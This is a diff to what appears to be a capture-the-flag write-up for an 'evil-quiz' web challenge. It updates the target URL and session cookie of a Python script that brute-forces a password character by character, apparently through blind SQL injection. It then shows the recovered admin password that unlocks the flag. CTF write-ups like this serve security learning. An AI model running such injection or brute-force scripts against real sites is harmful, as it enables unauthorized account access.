@@ -278,8 +278,8 @@ Sending requests with a proper SQL didn't work and after Googling online I found
 #!/usr/bin/env python3
 import requests
 
-url='https://hackyholidays.h1ctf.com/evil-quiz'
-cookies={'session': '4fbc0cc824c9ee373d677e1840288aaf'}
+url='https://d15c50b60103e5efbd704605423a3e07.ctf.hacker101.com/evil-quiz'
+cookies={'quizsession': 'c5438a3a52a2eca5abb70f8f19afa4e2'}
 alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'
 
 def attack(password):
@@ -303,3 +303,5 @@ while True:
 Running the above script to retrieve the password resulted in: `S3creT_p4ssw0rd-$`</br>
 
 Logging in with `admin:S3creT_p4ssw0rd-$`, reveals the flag.</br>
+
+## Solution 10th flag
